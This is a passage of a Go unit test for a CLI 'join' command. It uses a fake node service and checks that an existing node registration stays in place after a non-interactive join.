		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
		token: "tok",
	}

	svc := &fakeNodeService{
		getNodeFn: func(req *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
			return &nodev1.GetNodeResponse{
				ExternalNode: &nodev1.ExternalNode{
					ExternalNodeId: req.GetExternalNodeId(),
					ConnectivityInfo: &nodev1.ConnectivityInfo{
						Status: nodev1.NetworkMemberStatus_NETWORK_MEMBER_STATUS_CONNECTED,
					},
				},
			}, nil
		},
	}

	deps, server := testJoinDeps(t, svc, regStore)
	defer server.Close()

	term := terminal.New()
	opts := joinOpts{interactive: false, name: "Existing", orgName: "TestOrg"}
	err := runJoin(context.Background(), term, store, opts, deps)
	if err != nil {
		t.Fatalf("expected nil error when already registered with no name, got: %v", err)
	}

	// Registration should still exist
	exists, _ := regStore.Exists()
	if !exists {
		t.Error("expected registration to still exist")
	}
}
